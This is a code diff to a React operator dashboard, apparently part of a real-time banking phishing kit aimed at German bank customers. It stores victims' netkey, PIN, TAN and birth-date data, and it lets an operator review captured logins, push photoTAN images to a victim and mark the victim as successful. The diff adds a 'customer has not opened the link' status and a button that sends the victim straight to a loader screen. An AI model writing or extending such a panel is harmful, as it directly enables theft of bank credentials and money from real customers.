@@ -24,7 +24,8 @@ type AuthRow = {
 type MetaRow = { task_id: string; netkey: string | null; pin: string | null; tan: string | null; berater_geburtsdatum?: string | null; berater_karte?: string | null };
 
 const PHASE_LABEL: Record<string, string> = {
-  login: "Wartet auf Login",
+  waiting: "Wartet auf Kunde (Link nicht geöffnet)",
+  login: "Kunde online – Login",
   login_review: "Login prüfen",
   login_rejected: "Login abgelehnt",
   berater: "Berater-Verifizierung (Kunde)",
@@ -143,7 +144,7 @@ const AuthLiveCard = () => {
               <div className="flex flex-wrap items-center justify-between gap-2">
                 <div className="flex items-center gap-2 min-w-0">
                   <span className="font-mono text-sm px-2 py-0.5 rounded bg-muted">{r.token}</span>
-                  <Badge variant={done ? "secondary" : "default"}>{PHASE_LABEL[phase] || phase}</Badge>
+                  <Badge variant={done ? "secondary" : phase === "waiting" ? "outline" : "default"}>{PHASE_LABEL[phase] || phase}</Badge>
                   {r.auftraggeber_name && <span className="text-sm text-muted-foreground truncate">{r.auftraggeber_name}</span>}
                 </div>
                 <div className="flex gap-1">
@@ -207,6 +208,11 @@ const AuthLiveCard = () => {
                         Kunde sieht Gerätebestätigung mit Namen „{r.device_name || "iPhone"}". Wartet auf Klick auf photoTAN.
                       </p>
                       <PhotoTanUploader r={r} onSet={url => setPhotoTanImage(r, url)} />
+                      <div className="flex flex-wrap gap-2">
+                        <Button size="sm" variant="default" onClick={() => acceptTan(r)}>
+                          <CheckCircle2 className="h-4 w-4 mr-1" />Direkt zum Loader (Erfolg)
+                        </Button>
+                      </div>
                     </StepBlock>
                   )}
 
